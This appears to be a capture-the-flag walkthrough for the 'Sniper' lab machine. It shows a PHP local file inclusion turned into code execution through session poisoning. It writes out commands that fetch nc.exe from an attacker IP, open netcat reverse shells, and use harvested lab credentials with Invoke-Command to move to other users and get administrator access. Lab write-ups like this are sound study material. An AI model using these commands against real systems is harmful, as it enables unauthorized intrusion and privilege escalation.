# Sniper: Machine Notes

## Recon

### Nmap
- Port 80/tcp: Microsoft IIS httpd 10.0
- Port 135, 139, 445: Standard Windows RPC/SMB

### LFI Discovery
- Vulnerable parameter: `lang` in `http://sniper.htb/blog/?lang=`
- Proof of Concept:
```bash
curl -s http://sniper.htb/blog/?lang=/Windows/System32/drivers/etc/hosts
```

## Exploitation

### LFI to RCE (Session Poisoning)
1. Inject PHP code into the session file by attempting to log in with a malicious username:
   - Payload: `<?=`powershell /enc [BASE64_ENCODED_PS_COMMAND]`?>`
2. Locate the PHP session file on disk (e.g., `\windows\temp\sess_[SESSION_ID]`).
3. Payload for reverse shell (Base64 encoded):
```bash
# Download nc64.exe
echo 'wget http://10.10.15.244:9800/nc64.exe -o C:\Windows\TEMP\nc.exe' | iconv -t UTF-16LE | base64

# Execute reverse shell
echo 'C:\Windows\TEMP\nc.exe -e cmd.exe 10.10.15.244 1234' | iconv -t UTF-16LE | base64
```
4. Trigger RCE:
```bash
curl -s -G 'http://10.129.25.224/blog/' --data-urlencode 'lang=\windows\temp\sess_[SESSION_ID]'
```

### Initial Foothold
- User: `nt authority\iusr`

## Lateral Movement

### Extracting Credentials
- Found `db.php` in `C:\inetpub\wwwroot\user`:
  - User: `dbuser`
  - Password: `36mEAhz/B8xQ~2VM`

### Pivot to Chris
- Use PowerShell to run commands as user `chris`:
```powershell
$password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM"; 
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris",$password; 
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -nv 10.10.15.244 4444 -e cmd.exe } -credential $credential
```

## Privilege Escalation

### Admin Access
- Discovered through documentation/CHM file analysis or other notes that the Administrator password is: `butterfly!#1`.
- Escalate to Administrator using the same `Invoke-Command` method:
```powershell
$password = convertto-securestring -AsPlainText -Force -String "butterfly!#1"; 
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\Administrator",$password; 
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -nv 10.10.15.244 5555 -e cmd.exe } -credential $credential
```
